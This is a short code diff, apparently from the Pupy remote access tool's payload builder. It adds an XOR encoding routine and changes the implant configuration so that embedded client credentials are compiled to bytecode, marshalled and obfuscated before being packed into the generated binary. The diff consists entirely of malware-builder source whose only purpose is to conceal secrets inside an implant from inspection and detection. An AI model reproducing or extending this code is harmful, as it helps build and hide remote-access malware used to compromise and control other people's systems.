@@ -75,6 +75,12 @@ def get_edit_binary(path, conf, compressed_config=True):
     binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
     return binary
 
+def to_pye(data):
+    output = bytearray(len(data))
+    for i,x in enumerate(data):
+        output[i] = (ord(x)^((2**((65535-i)%65535))%251))
+    return output
+
 def get_raw_conf(conf, obfuscate=False, verbose=False):
     credentials = Credentials(role='client')
 
@@ -113,10 +119,10 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
         colorize("[+] ", "green") + ', '.join(required_credentials)
     )
 
-    embedded_credentials = '\n'.join([
+    embedded_credentials = compile('\n'.join([
         '{}={}'.format(credential, repr(credentials[credential])) \
         for credential in required_credentials if credentials[credential] is not None
-    ])+'\n'
+    ])+'\n', '<cs>', 'exec')
 
     if verbose:
         for k, v in conf.iteritems():
@@ -128,7 +134,7 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
     config = '\n'.join([
         'pupyimporter.pupy_add_package({})'.format(
             repr(cPickle.dumps({
-                'pupy_credentials.py' : embedded_credentials
+                'pupy_credentials.pye' : ('\0'*8) + to_pye(marshal.dumps(embedded_credentials))
             }))),
         dependencies.importer(set(
             'network.transports.{}'.format(transport) for transport in transports_list
